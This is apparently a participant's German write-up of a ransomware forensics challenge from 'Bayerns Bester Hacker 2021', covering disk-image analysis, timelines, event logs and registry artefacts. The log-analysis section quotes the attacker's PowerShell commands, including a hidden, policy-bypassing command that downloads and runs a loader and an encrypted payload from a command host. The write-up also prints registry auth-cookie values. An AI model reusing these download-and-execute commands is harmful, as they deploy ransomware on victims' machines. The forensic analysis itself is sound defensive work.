# Bayerns Bester Hacker 2021 / Challenge 2

![Bayerns Bester Hacker 2021](../images/BBH_Logo_2021.png)


## Briefing

Herzlich willkommen zur zweiten Aufgabe von „Bayerns bester Hacker“!

Das Firmennetzwerk der RAe Schmitt wurde angegriffen und mehrere Clients sind jetzt verschlüsselt (Siehe Foto im Anhang).

Von den Angreifern hat die RAe Schmitt folgende Nachricht erhalten:

![Ransom Note](171a2c18-9396-4145-b9f2-50c5ab53c0eb)

Wir haben die Festplatten des zuerst infizierten Clients von Leonardo Maier exportiert und unter https://share.wlh.io/l/34ba2ada-bbb1-47d0-be33-808f6af5b1c0 bereitgestellt.
Zum Download des Abbilds musst du bitte deinen Namen und deine Email-Adresse hinterlegen.
Das Abbild des Systems liegt als .raw-Datei mit folgender sha256sum vor:
dd49b35847c61c3be75452d82dbfac8ecb5fa9ceda2a04562c32d8c67058ade2 client.raw
Falls es beim Download der Datei Probeme gibt sag uns bitte kurz Bescheid.

Leider hat der Administrator der RAe Schmitt erneut seine Inkompetenz bewiesen und keine Offline-Backups erstellt.

Zur erfolgreichen Lösung der Aufgabe erwarten wir von dir einen kurzen Bericht in dem folgende Fragen geklärt werden:
- Wie wurde das Netzwerk der RAe Schmitt infiziert?
- Was haben die Angreifer auf den Systemen der RAe Schmitt gemacht?
- Können Daten oder Teile der Daten wiederhergestellt werden? Bitte lass uns eine entschlüsselte Datei zukommen.
Wir bewerten dabei auch deine Herangehensweise und die Qualität deiner Dokumentation.

Achtung: Bitte führe keine Anwendungen, die du auf dem infizierten Client findest, auf deinem System aus. Dateien könnten unwiderruflich verloren gehen.
Wir empfehlen für die Untersuchung des Festplatten-Abbilds die Verwendung von virtuellen Maschinen.

Die nächste Aufgabe erhältst du frühestens ab dem 18.08.2021, wenn du die richtige Lösung unter challenge@bayerns-bester-hacker.de bei uns eingereicht hast. Über diese E-Mail Adresse kannst du uns auch deine Fragen stellen.
Um dich für die nächste Runde zu qualifizieren, muss die Lösung bis spätestens 20.08.2021 bei uns eingehen.

Wir wünschen dir viel Spaß und freuen uns auf deine Lösung.
Happy Hacking!

Dein Challenge-Team von Bayerns Bester Hacker

![Screenshot](screenshot.jpg)


## Update: Offizieller Lösungsweg

[![Challenge & Solution #2 | Forensik | Bayerns Bester Hacker 2021](https://img.youtube.com/vi/D2YpQZIDipY/0.jpg)](https://www.youtube.com/watch?v=D2YpQZIDipY)


## Mein Lösungsweg


### Vorbereitung

Das bereitgestellte Image ([Link zum Share](https://share.wlh.io/l/34ba2ada-bbb1-47d0-be33-808f6af5b1c0)) wurde mit den folgenden Schritten heruntergeladen, entpackt und auf die angegebene Prüfsumme getestet:
```
wget https://share.wlh.io/segubox/v1/drive/f6ca3255-151b-4fc6-85d8-04f9cf8db834 -O image.raw.zst;
sha256sum image.raw.zst;
  f0c18220b3023c72a5dfc7b200b87c06f22050bd291284f99a3278954b5b0d60  image.raw.zst
  --> analog Download-Interface
unzstd image.raw.zst
sha256sum image.raw
  erwartet: dd49b35847c61c3be75452d82dbfac8ecb5fa9ceda2a04562c32d8c67058ade2
  ist: dd49b35847c61c3be75452d82dbfac8ecb5fa9ceda2a04562c32d8c67058ade2  image.raw
```

Das Festplattenabbild besteht aus drei Partitionen:
```
fdisk -lu image.raw;

Disk image.raw: 60 GiB, 64424509440 bytes, 125829120 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xd00c2a4e

Device     Boot     Start       End   Sectors  Size Id Type
image.raw1 *         2048    104447    102400   50M  7 HPFS/NTFS/exFAT
image.raw2         104448 124750715 124646268 59.4G  7 HPFS/NTFS/exFAT
image.raw3      124751872 125825023   1073152  524M 27 Hidden NTFS WinRE
```
Hier sind die *image.raw1* die Boot-Partition und *image.raw3* die Sicherungspartition. Wir werden auf der *image.raw2* (knapp 60GB) arbeiten.

Danach wird das rohe Abbild zur Verwenden vorbereitet und **read-only**, vor unbeabsichtigten Veränderungen geschützt, bereitgestellt:
```
losetup -Pf image.raw;
mount -o ro /dev/loop10p2 drive/;
```

Hinweis: die Analyse wurde auf einem angemieteten Webserver auf der Basis Ubuntu 20.04 durchgeführt.


### Analyse


#### Informations-Sammlung aus Daten der Email

Identifier aus der Nachricht des Erpressers:
* **Client-ID**: 277aef46-3504-4afa-ae6c-6d1c013589bc
* **BTC Wallet**: bc1qsjnp0f4kunjq9xtagnurg003lkyejrarmt3mvv

Testing der mitgeschickten Bilder auf verstecke Payloads mit [binwalk](https://github.com/ReFirmLabs/binwalk) hat keine Resultate geliefert.

[Exif](http://exif.regex.info/exif.cgi)-Daten aus [screenshot.jpg](screenshot.jpg) zur Vollständigkeit, ergaben aber keine weiteren Hinweise für die Lösung der Challenge.
Exif Field | Value
------------ | -------------
Camera | Apple iPhone 12
Lens | iPhone 12 back dual wide camera 4.2mm f/1.6<br>Shot at 4.2 mm
Exposure | Auto exposure, Program AE, 1/121 sec, f/1.6, ISO 50
Flash | Auto, Did not fire
File Comment | Optimized by JPEGmini 3.18.4.211672608-TBTBLNP 0x88155d6d
Date | August 7, 2021   2:16:52PM (timezone not specified)<br>(11 days, 19 hours, 50 minutes, 1 second ago, assuming image timezone of 1 hour ahead of GMT)	
Latitude/longitude | 49° 18' 23.3" North,   6° 53' 29.9" East<br>( 49.306481, 6.891642 )
Altitude | 224 meters (735 feet)
Camera Pointin | North-northeast
File | 3,024 × 4,032 JPEG (12.2 megapixels)<br>2,346,893 bytes (2.2 megabytes)
Exif Image Size | 4,032 × 3,024
Make | Apple
Camera Model Name | iPhone 12
Orientation | Rotate 180
Software | 14.6
Modify Date | <b>2021:08:07</b> 14:16<small>:52</small><br><small>11 days, 11 hours, 50 minutes, 1 second ago</small>
Host Computer | iPhone 12
Y Cb Cr Positioning | Centered
Exposure Time | 1/121
F Number | 1.60
Exposure Program | Program AE
ISO | 50
Exif Version | 0232
Date/Time Original | <b>2021:08:07</b> 14:16<small>:52</small><br><small>11 days, 11 hours, 50 minutes, 1 second ago</small>
Create Date | <b>2021:08:07</b> 14:16<small>:52</small><br><small>11 days, 11 hours, 50 minutes, 1 second ago</small>
Offset Time | +02:00
Offset Time Original | +02:00
Offset Time Digitized | +02:00
Components Configuration | Y, Cb, Cr, -
Shutter Speed Value | 1/121
Aperture Value | 1.60
Brightness Value | 4.855434094
Exposure Compensation | 0
Metering Mode | Multi-segment
Flash | Auto, Did not fire
Focal Length | 4.2 mm
Subject Area | 2009 1503 2208 1327
Maker Note Apple | (1,330 bytes binary data)
Sub Sec Time Original | 844
Sub Sec Time Digitized | 844
Flashpix Version | 0100
Color Space | Uncalibrated
Sensing Method | One-chip color area
Scene Type | Directly photographed
Exposure Mode | Auto
White Balance | Auto
Focal Length In 35mm Format | 26 mm
Scene Capture Type | Standard
Lens Info | 1.549999952-4.2mm f/1.6-2.4
Lens Make | Apple
Lens Model | iPhone 12 back dual wide camera 4.2mm f/1.6
Exif 0xa460 | 2
GPS Latitude Ref | North
GPS Latitude | 49.306481 degrees
GPS Longitude Ref | East
GPS Longitude | 6.891642 degrees
GPS Altitude Ref | Above Sea Level
GPS Altitude | 224.1322594 m
GPS Speed Ref | km/h
GPS Speed | 0
GPS Img Direction Ref | True North
GPS Img Direction | 14.68480684
GPS Dest Bearing Ref | True North
GPS Dest Bearing | 14.68480684
GPS Date Stamp | <b>2021:08:07</b><br><small>12 days, 2 hours, 6 minutes, 53 seconds ago</small>
GPS Horizontal Positioning Error | 65 m
Resolution | 72 pixels/inch


#### Gelöschte Dateien in Papierkorb und Filesystem 

Prüfung des System-Papierkorbs auf zurückgelassene Dateien. Zwei Open Document Dateien wurden gefunden und auf eingebettete Marcos/Schadcodes überprüft. Die Analyse ergab keine Ergebnisse:
```
drive/$Recycle.Bin/S-1-5-21-2657259945-4291462189-1437507142-1107$ file *
$IYT3U20.odt: data
$RYT3U20.odt: OpenDocument Text
```

Versuch gelöschte Dateien über das NTFS-Filesystem wiederherzustellen:
```
sudo ntfsundelete /dev/loop10p2 --scan
sudo ntfsundelete /dev/loop10p2 --scan |less
sudo ntfsundelete /dev/loop10p2 --undelete --inodes 33908-33909
```
Auch hier konnten nur zwei Systemdateien rekonstruiert werden, welche für den weiteren Angriffsverlauf nicht relevant waren.


#### Timeline erstellen

Um einen genauen Verlauf des Angriffs, Dateizugriffe, Änderungen am System und Ausbreiten des Angreifers nachzuvollziehen, wurde mit [log2timeline/plaso](https://github.com/log2timeline/plaso) eine Timeline erstellt und mit ```psort``` nach dem jeweiligen Zeitstempel sortiert:
```
psteal.py --source image.raw -o dynamic -w 2021-08-08_psteal-output.csv;
log2timeline.py --storage-file 2021-08-08_timeline.plaso image.raw;
psort.py -o dynamic -w 2021-08-08_psteal-output.csv 2021-08-08_timeline.plaso;
```
![Bayerns Bester Hacker 2021 Challenge 2 - Timeline](Screenshots/BBH2021C2_Timeline.jpg)

Anschließend wurde parallel zur Verarbeitung der Analyse oben ein Bodyfile mit den wcithigen System-Logs und Zugriffen erstellt:
```
regtime.pl -m HKLM-SYSTEM -r drive/Windows/System32/config/SYSTEM >> regtime.txt:
regtime.pl -m HKLM-SAM -r drive/Windows/System32/config/SAM >> regtime.txt;
regtime.pl -m HKLM-SECURITY -r drive/Windows/System32/config/SECURITY >> regtime.txt;
regtime.pl -m HKLM-SECURITY -r drive/Windows/System32/config/SOFTWARE >> regtime.txt;
regtime.pl -m HKLM-SOFTWARE -r drive/Windows/System32/config/SOFTWARE >> regtime.txt;
```
Output: [regtime.txt](regtime.txt)


#### Virenscan

Beim manuellen Durchforsten sprang gleiche ein Verzeichnis mit einem bekannten Dateiinhalt ins Auge ```C:/Core/svhost.exe``` die dort verdächtig platziert aussieht. Eine Analyse mit [Virustotal.com](https://www.virustotal.com/) ergab den Hinweis auf den Payload:

```
C:/Core/svhost.exe
  cd1a52bf190932a8c63c42d2643d35be2914d86839e3c24bb3512d99471fe166  svhost.exe
```
![Bayerns Bester Hacker 2021 Challenge 2 - Infected File](Screenshots/BBH2021C2_InfectedFile.jpg)
Quelle: https://www.virustotal.com/gui/file/cd1a52bf190932a8c63c42d2643d35be2914d86839e3c24bb3512d99471fe166/detection

Wurde durchgeführt mit:
```
clamscan -z -i -r --log=clamscan.txt --detect-pua=yes --scan-mail=yes --heuristic-alerts=yes --alert-macros=yes  drive/
```

Ergebnis des Scans: [clamscan.txt](clamscan.txt) ergab eine Menge false positives, die unter anderem diese verdächtigen, aber nicht schadhaften Einträge beinhaltet:
```
in drive/Program Files/j-lawyer-server/
j-lawyer-data/templates/vorinstalliert/Community/j-lawyer-Forderungskonto-[jphaag].ods: PUA.Doc.Tool.LibreOfficeMacro-2 FOUND
wildfly/modules/system/layers/base/org/jboss/as/console/main/hal-console-3.1.2.Final-resources.jar: PUA.Html.Exploit.CVE_2012_0469-1 FOUND
```

Die false positives wurden bei Virustotal überprüft, wie bspw. vbc.exe:
```drive/Windows/WinSxS/x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15805.0_none_de9b06e519e58d0f/vbc.exe: Win.Malware.Generic-9882237-0 FOUND```
 mit einem negativen Ergebnis https://www.virustotal.com/gui/file-analysis/MGE3NjA4ZGIwMWNhZTA3NzkyY2VhOTVlNzkyYWE4NjY6MTYyOTE0Mzg4OQ==/detection


#### Log-Analyse

Eine forensische Analyse stützt sich auf die Auswertung aller Hinweise, vor allem in den Logfiles. Zum einen gab es ein konkretes Protokoll des Angriffs (siehe [Windows/System32/aadbg.log](aadbg.log)), auf das wir gleich später eingehen.

Zu dem hat sich im Powershell-Eventlog gezeigt, wie die Übernahme des System von statten ging:
![Bayerns Bester Hacker 2021 Challenge 2 - Powershell Event Log](Screenshots/BBH2021C2_EvtLog-Powershell.jpg)
Die im Log gezeigte Datei ```loader2.ps1``` konnte leider nicht sichergestellt oder wiederhergestellt werden. Der ausgeführte Befehl in der Datei ist im Log zu finden. Die binären Windows-Eventlogs können unter Linux mit einem Programm wie [python-evtx](https://github.com/williballenthin/python-evtx) in XML-Daten überführt und damit besser ausgewertet werden.

Im Verzeichnis ```Windows/System32/winevt/Logs``` finden sich die jeweiligen Windows Event Logs.

Eine Auswertung
```
Windows/System32/winevt/Logs$ evtx_dump.py Windows\ PowerShell.evtx
Windows/System32/winevt/Logs$ evtx_dump.py Windows\ PowerShell.evtx | grep HostApplication | sort | uniq
```
Ergibt die Ausführung der folgenden Befehle:
* ```powershell -Command (New-Object Net.WebClient).DownloadFile('https://karen.h07.wlh.io/loader/loader2.ps1', 'C:\Users\l.maier\Desktop\loader2.ps1')```
  Lud den Payload-Loader auf das System
* ```Powershell.exe -Command &amp; {Start-Process Powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\l.maier\Desktop\loader2.ps1' -Verb RunAs}```
  Zur Eskalation der Rechte
* ```powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\l.maier\Desktop\loader2.ps1```
  Führte den Loader aus, unter Nicht-Beachtung vorhandener Policies (Bypass := Nothing is blocked and there are no warnings or prompts.) und ohne Prompt (Style Hidden)
* ```HostApplication=powershell.exe -encodedCommand TgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABkAGkAcgBlAGMAdABvAHIAeQAgAC0AUABhAHQAaAAgAEMAOgBcAEMAbwByAGUAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAOgAvAC8AawBhAHIAZQBuAC4AaAAwADcALgB3AGwAaAAuAGkAbwAvAGIAaQBuAC8AZQBuAGMAcgB5AHAAdAAtAHcAaQBuAGQAbwB3AHMALQBiAHUAbgBkAGwAZQBkACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAQwBvAHIAZQBcAHMAdgBoAG8AcwB0AC4AZQB4AGUAOwAgAFMAdABhAHIAdAAgAEMAOgBcAEMAbwByAGUAXABzAHYAaABvAHMAdAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=```
  Während dieser base64 codierte Befehl den Schadcode nachlädt und auf dem System ausführt. Der Schadcode ist die obig angesprochene Datei Core/svhost.exe und wurde in diesem Befehl auch als Background-Prozess gestartet:
  ```New-Item -ItemType directory -Path C:\Core; Invoke-WebRequest http://karen.h07.wlh.io/bin/encrypt-windows-bundled -OutFile C:\Core\svhost.exe; Start C:\Core\svhost.exe -WindowStyle Hidden```

Die Befehle leden auch den Command-Server unter *https://karen.h07.wlh.io/* offen.

Die Timeline-Analyse und Auswertung der HKLM-Einträge in der Windows Registry zeigt dabei, dass die Infektion über eine manipulierte PDF-Datei erfolgte. Dazu wurde der [PDF-Reader in Microsoft Edge](https://docs.microsoft.com/de-de/deployedge/microsoft-edge-pdf) ausgenutzt, um eine Shell zu öffnen und ein Kommando abzusetzen. Dieses hat wiederrum einen weiteren Befehl als anderer User ausgeführt:
![Bayerns Bester Hacker 2021 Challenge 2 - Exploit](Screenshots/BBH2021C2_PDF-Shell-Runas.jpg)
Einen Rückschluss, welche PDF-Datei dies genau verursacht hat, kann daraus nicht gezogen werden.
![Bayerns Bester Hacker 2021 Challenge 2 - Run As Priviledge Escalation](Screenshots/BBH2021C2_runas1.jpg)

Die Powershell-Historie verrät unter anderem, dass das Skript sich in das System eingenistet hat und seine Entdeckung durch ein Abschalten des Windows Defenders verschleierte:
![Bayerns Bester Hacker 2021 Challenge 2 - Defender An](Screenshots/BBH2021C2_Microsoft-Defender-An.jpg)
![Bayerns Bester Hacker 2021 Challenge 2 - Defender Aus](Screenshots/BBH2021C2_Microsoft-Defender-Aus.jpg)

#### Download Client Archive

Das Webinterface zum Ransomware-Proof über die obig herausgearbeitete URL https://karen.h07.wlh.io erreichbar. Das Interface frägt die Client-ID aus dem [Bild](171a2c18-9396-4145-b9f2-50c5ab53c0eb) des Angreifers ab und öffnet per JavaScript ein ZIP-Archiv mit den Prüfdateien:
```
window.open(`/files/${document.getElementById('uuid').value}.zip`);
```
Ergibt zusammengesetzte die folgende URL: https://karen.h07.wlh.io/277aef46-3504-4afa-ae6c-6d1c013589bc.zip
Und kann dann gegebenenfalls für spätere Bruteforce Angriffe genutzt werden.

Der Download ergibt ein Zip-Archiv mit den folgenden Dateien:
* [277aef46-3504-4afa-ae6c-6d1c013589bc](277aef46-3504-4afa-ae6c-6d1c013589bc)
  * [backup.sh](277aef46-3504-4afa-ae6c-6d1c013589bc/backup.sh)
  * [karen.png](277aef46-3504-4afa-ae6c-6d1c013589bc/karen.png)

Diese Dateien gelten als entschlüsselter Proof und auch das ```backup.sh``` Script offenbar User und Host, die zum Zeitpunkt der Analyse aber nicht erreichbar waren.


#### WebCache

Die Datei ```WebCacheV01.dat``` aus ```C:/Users/l.maier/AppData/Local/Microsoft/Windows/WebCache/``` enthält alle wichtige Historie, Cookies, URLs aus Web, System und Netzwerk die aufgerufen wurden. Sowohl für den Nutzer Administrator und l.maier:

![Bayerns Bester Hacker 2021 Challenge 2 - Live und Laufwerk](Screenshots/BBH2021C2_Live-und-Laufwerk.jpg)
![Bayerns Bester Hacker 2021 Challenge 2 - Log und .karen Files erstmalig](Screenshots/BBH2021C2_Log-und-.karen.jpg)

Das Live.com Login Cookie für Nutzer **Administrator**:
```
[REG_SZ] ct%3D1627980322%26hashalg%3DSHA256%26bver%3D24%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253ECa0P2MFkYZfJQ4mcEGSF%252BmxGhLKaGDgLd4p%252B8arCTD6p%252B14VX7gtvMycr0OVFi9wcB2SNrf5nJ%252BZblcrvaV8b5Jxk9ksoYcGraQQC8d%252B/KzJ5qr4bwDpqraN/TbUpjqVLHJhrB51rzonGl40An4h1puHfVWdtMbyuliSq76WV/CWYvYykEBhnH3p%252BSsZm58IUzszl41KdqmN1b3mNIX%252B9OqUQr2ZH6dvYg/5OVvVwOKL2mmi9c3PacKWD3RKLd2Nw6md%252Bzt8teBiAbvk/LQHJMeSXDPIdg8a%252Be/nbISBN0IPZqf8JWEWEBNdBU%252BVg4iioRI9KXMPwVlAq4nqKfFKvuG5TFkdRMGKFRgEsyms6PrRsfd3i3zjVbr2ly/uIALiZERBmDOYFINWjrZn/eCECsN5ZjwYIu5dP5uwZiG5G19yKbr1K3hOSC7yeivqS%252BBvsgQRlkScCAsYrhHh3JY3KoPnE9p7Jjc8Y1nHW%252ByftB%252Big3QrxXIes2WOugC8x4I8RA%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3D4ar4KcGeL%252FNUTGKQcRtfoIxWJtI1ZY%252BU%26hash%3DtGmYf6mrdJSoMVIDafJhdDSV9tHdNmrTtNJw4vKXVec%253D%26dd%3D1; path=/; domain=login.live.com; secure; httponly Flags: [REG_DWORD_LE] 8256 Name: [REG_SZ] DIDC P3P: [REG_SZ] CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT" URL: [REG_SZ] https://login.live.com,winreg/winreg_default,NTFS:\Users\Administrator\NTUSER.DAT,
```

Das System-Cookie fur Live.com:
```
2021-08-07T09:50:38.000000+00:00,Content Modification Time,REG,Registry Key,[HKEY_CURRENT_USER\SOFTWARE\Microsoft\AuthCookies\Live\Default\DIDC] Data: [REG_SZ] ct%3D1628337057%26hashalg%3DSHA256%26bver%3D24%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253ECfVUe0aHrWbx7U9BBwYYsf0XmTmXZRCQRxr4cFpqdOR%252BOuj/dJQeX72LYVTOmgt33zvBup9kEKIKhVioZ/akxq2nMyrzmoTWuB6iP0AXAmsHItgZ5OIaHeLS4O9YjqtJKsCNMNwgZJO//DZw8I/aQSwh2AtH%252BkIILuYXcp3FmVgQqnMSY8Ll0pzUOer8wbckNRjhpCfd64gH3HvcwBv1VUPcvxLfuZI0U4ukXiixmF7Lf4qhubtIs7l4DlQKkG3YXRo8omgodbApCZtvXohN9tCyrVAve6Oi8yKRDbwpaMtHKdnRrKIkJCOz3Rs%252BIkz2IFbLIPFhsWUL2al5RFpwwGAlxc3qkqI7Y2jDTJkQIOfCC%252BYrinFfITYG1mrSZb2iEqcKgUuetaqgtt0OMWE%252B5ZQNEE%252Ba%252BrviCXCPU5CiA6T1lqHH5aR5AJcgFOCbks09fvNpGa4hxvHWX4GBTqpCM%252BtEoBrwP%252Bj3hNJgimvKwFQ6O%252BeA6DR%252BbSg7gVly8Jk4wQ%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DtlNSgsn4%252FjjYZDl2b7am6yCdoMXmJ8YN%26hash%3DsEDlgikdid4TI1QOxOjI3KbORbDRb6gogl4Id4%252BrN1Q%253D%26dd%3D1; path=/; domain=login.live.com; secure; httponly Flags: [REG_DWORD_LE] 8256 Name: [REG_SZ] DIDC P3P: [REG_SZ] CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT" URL: [REG_SZ] https://login.live.com,winreg/winreg_default,NTFS:\Windows\ServiceProfiles\LocalService\NTUSER.DAT,-
```

Live.com / Office.com Login Cookie für User **l.maier**:
```
2021-08-07T10:11:00.000000+00:00,Content Modification Time,REG,Registry Key,[HKEY_CURRENT_USER\SOFTWARE\Microsoft\AuthCookies\Live\Default\DIDC] Data: [REG_SZ] ct%3D1628338279%26hashalg%3DSHA256%26bver%3D24%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253ECTZKAoRyyT3J0ppx4YeROjc3sRo/KvMjSEal0DsumuVyJFLlrSONR/L9HquswAdErbg5yaNpcRhCs48/GodqfQHa11WFHFUilfoSQ/EhoIQTrfI8A/B2//GoKb7xY%252BlCk9lk/qf7QF37Jg8jIvs2YfoEdAMqeSx6Ry/kyU1c5b0EJDnRgqGu8H6HC8PozNYc1lpVHB0QyE6ybTUPs31S9SlCSH%252B0UU1F%252BfX3WysDwtET%252BR6N2HNtKPp/Rv7Vo4K5Rqol8w/kepavoq0DacnpFcakN6e09qGfyMxbDbCjyvjp/Y%252B6hWFFFUXlWzZjgFrLGdN0oeKtO3djRZQjtE87jXdoa%252BSpffMJonJ8u2Gd/b7EAHGyN2qGTEMwFjjFj%252BK5nRHg1d1FgHirm75d4fv01MH3NMPyaft9XFBqHGM4/bO1D888sG0a6KCrVs0US34dGv1DEY/G1asTWVGvkzM3nbAZ/waW/oeT7naOfPOHUiTccAT7gc32JnZmzRC6c1aRTw%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DtRE1ikPOOYr%252Fvu6qAeD5ucR0lkGAHTpP%26hash%3DtJ5wi30OOgpzS3QjzkJhDOdMeg9wvFcHtOuLnzQCaO4%253D%26dd%3D1; path=/; domain=login.live.com; secure; httponly Flags: [REG_DWORD_LE] 8256 Name: [REG_SZ] DIDC P3P: [REG_SZ] CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT" URL: [REG_SZ] https://login.live.com,winreg/winreg_default,NTFS:\Users\l.maier\NTUSER.DAT,-
```


#### Registry

![Bayerns Bester Hacker 2021 Challenge 2 - Registry Live Login Konto](Screenshots/BBH2021C2_Live-Login-Cookie.jpg)

![Bayerns Bester Hacker 2021 Challenge 2 - Task Scheduler](Screenshots/BBH2021C2_Recent-TaskSched.jpg)

Login und Rechteausweitung
![Bayerns Bester Hacker 2021 Challenge 2 - ](Screenshots/BBH2021C2_logon1.jpg)
![Bayerns Bester Hacker 2021 Challenge 2 - ](Screenshots/BBH2021C2_logon2.jpg)
![Bayerns Bester Hacker 2021 Challenge 2 - ](Screenshots/BBH2021C2_logon3.jpg)
![Bayerns Bester Hacker 2021 Challenge 2 - ](Screenshots/BBH2021C2_logon4.jpg)

#### Browsing History

```
drive/Users/l.maier/AppData/Local/Google/Chrome/User Data/Default$
  sqlite3 -line History
  "SELECT last_visit_time, datetime(last_visit_time / 1000000 - 11644473600, 'unixepoch', 'localtime'), url, title FROM urls ORDER BY last_visit_time DESC"
```
![Bayerns Bester Hacker 2021 Challenge 2 - Chrome History](Screenshots/BBH2021C2_Chrome-History.jpg)
![Bayerns Bester Hacker 2021 Challenge 2 - Browserverlauf](Screenshots/BBH2021C2_User-Browsing-History-Task-Scheduler.jpg)


#### Anomalien und weitere Entdeckungen

Ein Windows-Bat-Skript al JPG-Bild getarnt:
```wohnmobil.jpg                                                                                                .bat.karen```
Gleichermaßen wie das Bild ```C:/image.jpg``` ist ein ungewöhnlicher Speicherort.

Die privaten Bilder, Bewerbungen (l.maier/Desktop/bewerbungen( und PDF-Dokumente der Mandanten sind nicht mehr verfügbar.

Auf dem System sind diverse PGP-Keys vorhanden, welche nicht verschlüsselt wurden. Ein Import der Keys ist allerdings fehlgeschlagen, daher protokolliert aber zur Entschlüsselung nicht weiter verfolgt.
```
drive/Users/l.maier/AppData/Local/Microsoft/Edge/User Data/Default/Cache$ file * |grep PGP
f_000038.karen: PGP Secret Sub-key -
f_00017d.karen: PGP Secret Key -

Users/l.maier/AppData/Local/Google/Chrome/User Data/Default/Cache$ file * | grep PGP
f_000051.karen: PGP Secret Key -
f_00010b.karen: PGP Secret Sub-key -
f_00015d.karen: PGP Secret Sub-key -
f_000199.karen: PGP Secret Key -
f_0001a3.karen: PGP Secret Key -
```
![Bayerns Bester Hacker 2021 Challenge 2 - PGP Key unverschluesselt](Screenshots/BBH2021C2_PGP-Key.jpg)

Auch das Wechseln der Systemzeit lässt eine Verschleierung der genauen Zugriffsdaten vermuten:
![Bayerns Bester Hacker 2021 Challenge 2 - Neue Systemzeit](Screenshots/BBH2021C2_Zeitsprung.jpg)


** MySQL-Server** der j-laywer-Software hat User *root* mit einem leeren (lies ohne) Passwort:
```
drive/ProgramData/MySQL/MySQL Server 5.7/Data$ ls jlawyerdb/
drive/Programme/j-lawyer-server
drive/Programme/j-lawyer-client
<TimeCreated SystemTime="2021-08-05 04:59:41.733608"></TimeCreated>
<EventRecordID>1551</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="0" ThreadID="0"></Execution>
<Channel>Application</Channel>
<Computer>DESKTOP-B&#220;RO1.rae-schmitt.de</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data>&lt;string&gt;root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.&lt;/string&gt;
```

Logs finden sich hier
```
drive/ProgramData/MySQL/MySQL Server 5.7/Data$ ls
  auto.cnf  DESKTOP-BÃœRO1.err  DESKTOP-BÃœRO1.log  DESKTOP-BÃœRO1-slow.log  DESKTOP-BÜRO1.pid
```

Der Passwort-Safe des Admins ist in l.maier/Documents vorhanden, wurde vom Angreifer verschlüsselt und kann aktuell nicht eingesehen werden.


#### Netzwerk

IP | Beschreibung
-- | ------------
192.168.2.2 | Domain Controller mit Hostname win-horcue9m4ld.rae-schmitt.de
192.168.2.133 | DESKTOP-BÜRO1<br>CN=DESKTOP-B&#220;RO1,CN=Computers,DC=rae-schmitt,DC=de
192.168.2.135 | Ubuntu Linux Server mit SMB Datenfreigabe für Laufwerk R:\

![Bayerns Bester Hacker 2021 Challenge 2 - R:/](Screenshots/BBH2021C2_Netzlaufwerk.jpg)
![Bayerns Bester Hacker 2021 Challenge 2 - Login von Domain Controller](Screenshots/BBH2021C2_DomainController.jpg)


#### Autopsy

Nachtrag: Ein besonderer Hinweis gilt [Sleuthkit Autopsy](http://www.sleuthkit.org/autopsy/). Das Forensik-Tool und grafische Interface für einige weitere Software ist unabdingbar in der Analyse und Auswertung einer Fragestellung wie dieser.

